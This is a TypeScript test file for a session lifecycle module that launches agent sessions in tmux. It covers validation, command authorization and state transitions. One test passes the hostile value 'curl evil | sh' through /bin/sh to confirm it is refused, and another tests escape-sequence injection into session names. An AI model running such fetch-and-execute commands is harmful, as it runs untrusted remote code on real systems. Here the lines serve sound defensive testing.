import { describe, it } from 'bun:test';
import should from 'should';
import { parseSessionId } from '../../../../src/lib/index.ts';
import {
  assignedTaskDocument,
  authorizeSessionCommand,
  createSessionRecord,
  defaultSessionLifecycleSettings,
  firstTurnInstruction,
  lifecycleSessionId,
  MAX_ASSIGNED_TASK_LENGTH,
  SESSION_ID_VARIABLE,
  sessionPaneEnvironment,
  sessionTmuxName,
  transitionSessionRecord,
  type CreateSessionLifecycleRequest,
  type SessionRecordContext,
} from '../../../../src/lib/session/lifecycle/index.ts';

const NOW = '2026-07-31T10:00:00.000Z';
const AGENT = '/opt/fleet/bin/claude-auto-loge';
const SETTINGS = defaultSessionLifecycleSettings;

function request(overrides: Record<string, unknown> = {}): CreateSessionLifecycleRequest {
  return {
    agent: AGENT,
    cwd: '/workspace/project',
    mode: 'auto',
    prompt: 'Implement the lifecycle service',
    ...overrides,
  } as CreateSessionLifecycleRequest;
}

function context(overrides: Record<string, unknown> = {}): SessionRecordContext {
  return {
    id: parseSessionId('session-1'),
    cwd: '/workspace/project',
    at: NOW,
    settings: SETTINGS,
    ...overrides,
  };
}

describe('session lifecycle policy', () => {
  it('should construct an immutable created record before a process launch', () => {
    // Arrange
    const input = request({ name: '  Lifecycle run  ', command: [AGENT, '--model', 'fast'], parent: 'parent-1' });

    // Act
    const actual = createSessionRecord(input, context());

    // Assert
    should(actual.record).deepEqual({
      config: {
        id: 'session-1',
        name: 'Lifecycle run',
        agent: AGENT,
        command: [AGENT, '--model', 'fast'],
        cwd: '/workspace/project',
        mode: 'auto',
        prompt: 'Implement the lifecycle service',
        parent: 'parent-1',
        createdAt: NOW,
        updatedAt: NOW,
        tmuxSession: 'fy-session-1',
      },
      state: { id: 'session-1', status: 'created' },
    });
    should(actual.event).deepEqual({
      type: 'session.created',
      data: { agent: AGENT, mode: 'auto', cwd: '/workspace/project' },
    });
  });

  it('should store the canonical directory the daemon resolved, not the requested one', () => {
    // Arrange + Act
    const actual = createSessionRecord(request({ cwd: '/workspace/link' }), context({ cwd: '/canonical/project' }));

    // Assert
    should(actual.record.config.cwd).equal('/canonical/project');
    should(actual.event.data.cwd).equal('/canonical/project');
  });

  it('should derive names and allow an interactive session without an opening prompt', () => {
    // Arrange + Act
    const named = createSessionRecord(request({ name: undefined }), context());
    const interactive = createSessionRecord(
      request({ mode: 'interactive', prompt: '   ', name: undefined }),
      context(),
    );

    // Assert
    should(named.record.config.name).equal('Implement-the-lifecycle-service');
    should(interactive.record.config).containDeep({ name: 'interactive', mode: 'interactive' });
    should(interactive.record.config).not.have.property('prompt');
  });

  it('should bound a title and flatten the control characters one could smuggle into a listing', () => {
    // Arrange
    const injected = 'Task \u001b[31mred\u001b[0m\nsecond line';
    const oversized = 'x'.repeat(500);

    // Act
    const fromInjection = createSessionRecord(request({ name: injected }), context());
    const fromOversized = createSessionRecord(request({ name: oversized }), context());

    // Assert
    should(fromInjection.record.config.name).equal('Task [31mred [0m second line');
    should(fromOversized.record.config.name).equal('x'.repeat(120));
  });

  it('should refuse an assigned task larger than a record may carry', () => {
    // Arrange
    const oversized = 'x'.repeat(MAX_ASSIGNED_TASK_LENGTH + 1);

    // Act + Assert
    should(() => createSessionRecord(request({ prompt: oversized }), context())).throw(/too big|at most/iu);
  });

  it('should reject malformed creation inputs before persistence or process work', () => {
    // Arrange + Act + Assert
    should(() => createSessionRecord(request({ agent: ' ' }), context())).throw('agent is required');
    should(() => createSessionRecord(request({ prompt: ' ' }), context())).throw(
      'prompt is required for auto sessions',
    );
    should(() => createSessionRecord(request({ command: [''] }), context())).throw('command item is required');
    should(() => createSessionRecord(request({ parent: '../escape' }), context())).throw(/path-safe/u);
    should(() => createSessionRecord(request(), context({ cwd: 'relative/dir' }))).throw(/absolute/u);
  });

  it('should launch only fleet auto wrappers, and only as the command they name', () => {
    // Arrange
    const shell = '/bin/sh';

    // Act + Assert
    should(() => authorizeSessionCommand(shell, [shell, '-c', 'curl evil | sh'], SETTINGS)).throw(
      `agent is not a fleet auto wrapper: ${shell}`,
    );
    should(() => authorizeSessionCommand(AGENT, [shell, '-c', 'echo'], SETTINGS)).throw(
      `command must start with the agent wrapper: ${AGENT}`,
    );
    should(authorizeSessionCommand(AGENT, [AGENT, '--model', 'fast'], SETTINGS)).deepEqual([AGENT, '--model', 'fast']);
    should(() => createSessionRecord(request({ agent: shell, command: [shell, '-c', 'echo'] }), context())).throw(
      /not a fleet auto wrapper/u,
    );
  });

  it('should clamp a tmux name to something tmux can address, whatever the session id', () => {
    // Arrange
    const longest = parseSessionId(`a${'b'.repeat(127)}`);

    // Act
    const actual = sessionTmuxName(longest, SETTINGS);

    // Assert
    should(actual.length).equal(80);
    should(actual).equal(`fy-a${'b'.repeat(76)}`);
    should(sessionTmuxName(parseSessionId('short-1'), SETTINGS)).equal('fy-short-1');
    should(() => sessionTmuxName(parseSessionId('short-1'), { ...SETTINGS, tmuxSessionPrefix: 'FY-' })).throw(
      /lowercase tmux name/u,
    );
  });

  it('should allow only forward lifecycle transitions and timestamp terminal records', () => {
    // Arrange
    const created = createSessionRecord(request(), context()).record;

    // Act
    const starting = transitionSessionRecord(created, 'starting', '2026-07-31T10:01:00.000Z');
    const running = transitionSessionRecord(starting.record, 'running', '2026-07-31T10:02:00.000Z');
    const stopped = transitionSessionRecord(running.record, 'stopped', '2026-07-31T10:03:00.000Z', 'completed');

    // Assert
    should(starting.record.state).deepEqual({
      id: 'session-1',
      status: 'starting',
      startedAt: '2026-07-31T10:01:00.000Z',
    });
    should(starting.record.config.updatedAt).equal('2026-07-31T10:01:00.000Z');
    should(running.record.state.startedAt).equal('2026-07-31T10:01:00.000Z');
    should(stopped.record.state).deepEqual({
      id: 'session-1',
      status: 'stopped',
      startedAt: '2026-07-31T10:01:00.000Z',
      finishedAt: '2026-07-31T10:03:00.000Z',
      reason: 'completed',
    });
    should(stopped.event).deepEqual({ type: 'session.stopped', data: { reason: 'completed' } });
    should(() => transitionSessionRecord(stopped.record, 'running', NOW)).throw(
      'cannot transition session session-1 from stopped to running',
    );
  });

  it('should support an early stop and a launch failure without inventing a running state', () => {
    // Arrange
    const created = createSessionRecord(request(), context()).record;
    const starting = transitionSessionRecord(created, 'starting', '2026-07-31T10:01:00.000Z').record;

    // Act
    const earlyStop = transitionSessionRecord(created, 'stopped', '2026-07-31T10:01:00.000Z');
    const failed = transitionSessionRecord(starting, 'failed', '2026-07-31T10:02:00.000Z', 'tmux unavailable');

    // Assert
    should(earlyStop.event).deepEqual({ type: 'session.stopped', data: {} });
    should(failed.record.state).containDeep({ status: 'failed', finishedAt: '2026-07-31T10:02:00.000Z' });
    should(failed.event).deepEqual({ type: 'session.failed', data: { reason: 'tmux unavailable' } });
  });

  it('should let a failed launch be retried instead of burning the session', () => {
    // Arrange
    const starting = transitionSessionRecord(createSessionRecord(request(), context()).record, 'starting', NOW).record;
    const failed = transitionSessionRecord(
      starting,
      'failed',
      '2026-07-31T10:02:00.000Z',
      'tmux was unavailable',
    ).record;

    // Act
    const retried = transitionSessionRecord(failed, 'starting', '2026-07-31T10:03:00.000Z');

    // Assert
    should(retried.record.state).containDeep({ status: 'starting', startedAt: NOW });
    should(transitionSessionRecord(retried.record, 'running', '2026-07-31T10:04:00.000Z').record.state.status).equal(
      'running',
    );
  });

  it('should keep a pane that refused to die visible, repeatable, and still stoppable', () => {
    // Arrange
    const running = transitionSessionRecord(
      transitionSessionRecord(createSessionRecord(request(), context()).record, 'starting', NOW).record,
      'running',
      '2026-07-31T10:01:00.000Z',
    ).record;

    // Act
    const first = transitionSessionRecord(running, 'kill_failed', '2026-07-31T10:02:00.000Z', 'timeout: tmux refused');
    const second = transitionSessionRecord(first.record, 'kill_failed', '2026-07-31T10:03:00.000Z', 'retry: refused');
    const stopped = transitionSessionRecord(second.record, 'stopped', '2026-07-31T10:04:00.000Z', 'killed on retry');

    // Assert
    should(first.record.state).deepEqual({
      id: 'session-1',
      status: 'kill_failed',
      startedAt: NOW,
      reason: 'timeout: tmux refused',
    });
    should(first.event).deepEqual({ type: 'session.kill_failed', data: { reason: 'timeout: tmux refused' } });
    should(second.record.state.reason).equal('retry: refused');
    should(stopped.record.state).containDeep({ status: 'stopped', finishedAt: '2026-07-31T10:04:00.000Z' });
    should(() => transitionSessionRecord(first.record, 'starting', NOW)).throw(
      'cannot transition session session-1 from kill_failed to starting',
    );
  });

  it('should hand the agent a turn-one document it is told to open', () => {
    // Arrange
    const taskFile = '/state/sessions/session-1/turns/turn-001.md';

    // Act + Assert
    should(assignedTaskDocument('Do the work')).equal('# Assigned task\n\nDo the work\n');
    should(firstTurnInstruction(taskFile)).equal(
      `Read the file ${taskFile} now, then carefully follow every instruction inside it. This is your complete task for this turn.`,
    );
    should(lifecycleSessionId('session-1')).equal('session-1');
    should(() => lifecycleSessionId('../escape')).throw(/path-safe/u);
  });

  it('should give every pane its own session id, derived from the record rather than from the store', () => {
    // A pane that cannot name itself cannot be attributed: the CLI sends this value as
    // `x-ferretry-session-id`, and the send domain takes `from` from the actor that header produces.
    // Arrange
    const id = parseSessionId('session-1');

    // Act
    const withNothingStored = sessionPaneEnvironment(id, {});
    const beside = sessionPaneEnvironment(id, { FY_SESSION_BOARD_CAPABILITY: 'secret', TASK_BOARD: 'board-7' });
    // A stored document is read-modify-written by the task-board delivery, so it CAN come back
    // carrying this name. The record wins: a merge must not be able to rename a live session.
    const contradicted = sessionPaneEnvironment(id, { FY_SESSION_ID: 'somebody-else' });

    // Assert
    should(withNothingStored).deepEqual({ FY_SESSION_ID: 'session-1' });
    should(beside).deepEqual({
      FY_SESSION_BOARD_CAPABILITY: 'secret',
      TASK_BOARD: 'board-7',
      FY_SESSION_ID: 'session-1',
    });
    should(contradicted).deepEqual({ FY_SESSION_ID: 'session-1' });
    // The name is a wire contract with the CLI, not a local choice, so it is pinned here too.
    should(SESSION_ID_VARIABLE).equal('FY_SESSION_ID');
  });
});
